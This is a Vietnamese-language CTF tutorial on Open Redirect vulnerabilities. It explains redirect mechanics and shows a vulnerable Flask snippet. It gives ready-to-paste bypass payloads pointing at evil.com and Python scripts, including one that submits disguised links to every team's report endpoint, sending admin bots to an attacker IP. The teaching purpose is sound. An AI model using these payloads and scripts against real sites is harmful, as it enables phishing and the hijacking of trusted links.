Open Redirect

Khi tham số ?url=/?next=/?redirect= cho phép trỏ ra bất kỳ domain nào — tự nó ít khi cho điểm trực tiếp, nhưng là mắt xích quan trọng: dùng để đưa admin bot "đi lạc" ra ngoài, hoặc làm bước trung gian trong chuỗi SSRF/OAuth.

Open Redirect là gì, để làm gì?

Nhiều trang có chức năng "sau khi đăng nhập, quay về trang trước đó" — lưu URL đích trong tham số (vd ?next=/dashboard), rồi dùng nó để redirect. Nếu app không kiểm tra URL đích có thuộc chính domain mình không, bạn đổi thành ?next=https://evil.com — link trông như của domain thật (vì bắt đầu đúng domain đó) nhưng cuối cùng đưa người bấm sang trang khác hoàn toàn.

Nếu chỉ nhớ một điều Open Redirect hiếm khi tự nó đủ điểm — giá trị thật nằm ở việc kết hợp: (1) "ngụy trang" link độc trông như link thật của domain tin cậy để lừa admin bot/nạn nhân bấm, hoặc (2) làm bước trung gian để vượt whitelist domain trong 1 lỗ hổng khác (SSRF check domain ban đầu nhưng không check sau khi redirect — xem bài SSRF mục 06.B).
⚡ COMBAT CARD — đọc trước, đủ để khai thác ngay
⚡ OPEN REDIRECT
🚩 Nhận ra trong 30 giây URL có tham số ?url=, ?next=, ?redirect=, ?return_to=, ?continue=. Thử đổi thành domain ngoài (vd https://example.com) → nếu trình duyệt thực sự chuyển sang trang đó ⟹ xác nhận.
✅ Tiền đề cần có Thường cần kết hợp với mục tiêu khác (gửi link cho admin bot, hoặc 1 bước trong chuỗi SSRF/OAuth) — ít khi tự nó là lời giải hoàn chỉnh.
🔍 Dò nhanh bằng Burp Repeater: đổi giá trị tham số redirect, Send, xem header Location trong Response (status 3xx) có trỏ đúng ra domain bạn đưa vào không.
💥 Payload dán-chạy-ngay 
# Cơ bản

# Vượt whitelist kiểm tra domain bắt đầu bằng "/"
?next=//evil.com
# Vượt whitelist kiểm tra CÓ CHỨA domain thật
?next=https://real-target.com.evil.com

# Vượt kiểm tra ký tự @ (phần trước @ chỉ là username, browser bỏ qua)
?next=https://real-target.com@evil.com
🐍 Script khai thác (điền host, chạy) 
import requests
r = requests.get("http://TARGET/login", params={"next": "https://evil.com"}, allow_redirects=False)
print(r.status_code, r.headers.get("Location"))
⚠️ Gotcha + 🛡️ WAF 1 dòng Tự thân ít điểm — luôn tự hỏi "redirect này giúp gì cho mục tiêu lớn hơn" (lừa bot, bypass whitelist). WAF rule nhanh: chặn giá trị tham số redirect bắt đầu bằng http/// trỏ ra ngoài domain chính. Chưa hiểu? đọc tiếp dưới.
01 / NỀN TẢNG BẮT BUỘC

Những thứ cần hiểu trước

HTTP redirect — server trả status 3xx (thường 302) kèm header Location: <url đích>, trình duyệt tự động chuyển sang URL đó mà không cần người dùng bấm gì thêm.
Protocol-relative URL — URL bắt đầu bằng // (không có http:) — trình duyệt tự hiểu là "dùng cùng giao thức hiện tại, nhưng đổi domain", dễ bị bỏ sót nếu bộ lọc chỉ kiểm tra chuỗi "http" ở đầu.

Code hay viết (thiếu kiểm tra domain đích):

# Python/Flask
next_url = request.args.get('next', '/')
return redirect(next_url)   # không kiểm tra next_url có thuộc domain mình không
02 / VÌ SAO LỖ HỔNG TỒN TẠI

Tin tưởng tham số redirect do chính người dùng cung cấp

Tính năng "quay về trang trước" vốn để tiện cho người dùng — lập trình viên ít khi nghĩ tới việc tham số đó cũng là input cần kiểm tra như mọi input khác. Cách vá đúng là chỉ chấp nhận đường dẫn tương đối (bắt đầu bằng / nhưng không phải //) hoặc so khớp domain đích với whitelist — bước này rất hay bị bỏ qua hoặc làm sai (chỉ check startswith/contains thay vì parse URL đúng cách).

03 / CƠ CHẾ HOẠT ĐỘNG ← MỤC LÕI

Vì sao link "trông như thật" lại lừa được người/bot

https://target-that-victim-trusts.com/login?next=https://evil.com/phish
Phần đầu URL (https://target-that-victim-trusts.com/login) là domain THẬT, hợp lệ — nạn nhân/bot kiểm tra bằng mắt (hoặc hệ thống tự động kiểm tra domain trước khi "cho phép mở link") đều thấy đúng domain tin cậy.
Nhưng sau khi tải xong trang login thật, server tự redirect sang https://evil.com/phish — nạn nhân/bot đã "rời khỏi" domain thật mà không nhận ra ngay, vì toàn bộ hành động chỉ là bấm vào 1 link trông hợp lệ.
Ứng dụng trong CTF: dùng chính link target.com/...?next=evil.com (không phải link evil.com trần trụi) để báo cho admin bot — một số hệ thống report URL có kiểm tra domain đầu vào phải thuộc chính app, open redirect giúp "qua mặt" bước kiểm tra này.

05 / KHAI THÁC BẰNG BURP SUITE

Bấm gì (từng bước)

Xác nhận bằng Repeater, quan sát header Location
  1. Bắt request có tham số redirect, Send to Repeater.
  2. Sửa giá trị thành domain ngoài, Send.
  3. Xem Response: status 3xx + header Location đúng domain ngoài ⟹ xác nhận. Lưu ý Burp Repeater mặc định không tự follow redirect — bạn thấy ngay response gốc, không cần tắt gì thêm.

08 / VIẾT SCRIPT KHAI THÁC (3 BẢN)

Từ tay-gõ-Burp sang script tự động

(A) Bản thủ công — để HIỂU từng bước

import requests

url = "http://TARGET/login"
r = requests.get(url, params={"next": "https://evil-test.com"}, allow_redirects=False)
print(r.status_code, r.headers.get("Location"))   # xác nhận trỏ đúng ra domain ngoài

(B) Bản gọn chắc — kết hợp report URL cho bot (giống bài XSS/CSRF)

import requests

# Dùng chính domain target để "ngụy trang" link report cho bot, thực chất chuyển hướng tới trang độc
disguised_url = "http://TARGET/login?next=http://YOUR_IP:8000/csrf.html"
requests.post("http://TARGET/report", data={"url": disguised_url})

(C) Bản A/D tái dùng — chạy mọi đội, mọi round

import requests

MY_IP = "10.10.X.X"

def exploit_redirect_combo(host):
    try:
        disguised = f"http://{host}/login?next=http://{MY_IP}:8000/"
        requests.post(f"http://{host}/report", data={"url": disguised}, timeout=5)
        return True
    except requests.RequestException:
        return False

if __name__ == "__main__":
    for host in open("teams.txt").read().split():
        exploit_redirect_combo(host)

Tình huống
✅Tham số redirect không kiểm tra domain đích, VÀ có nhu cầu kết hợp (report URL bị giới hạn domain, hoặc whitelist SSRF/OAuth).

13 / BÀI TẬP & THUẬT NGỮ

Luyện tập

⭐ Làm lại: dựng ví dụ mục 09 bằng tay, kết hợp Open Redirect với CSRF PoC đã học ở bài trước.

Gợi ý nếu kẹtNhớ test riêng Open Redirect trước (xác nhận header Location đúng) rồi mới ghép vào URL report, tránh nhầm lẫn lỗi ở bước nào.

⭐⭐ Đổi 1 biến: form report chặn domain bằng url.startswith('http://TARGET.com'). Tìm Open Redirect vượt được check này.

Gợi ý nếu kẹtURL redirect VẪN bắt đầu đúng http://TARGET.com (qua được check), chỉ khác ở việc nó TỰ CHUYỂN HƯỚNG sau khi tải — check domain ban đầu không có nghĩa không bị redirect tiếp.

⭐⭐⭐⭐ Tự nghĩ: không tìm thấy chức năng report URL nào trong challenge. Nghĩ 1 cách khác Open Redirect vẫn có giá trị dù không có admin bot.

Gợi ý nếu kẹtKiểm tra app có dùng chính tham số redirect này trong 1 luồng OAuth/SSO nội bộ nào không — leak token qua redirect_uri là trường hợp Open Redirect vẫn tự có giá trị mà không cần bot.
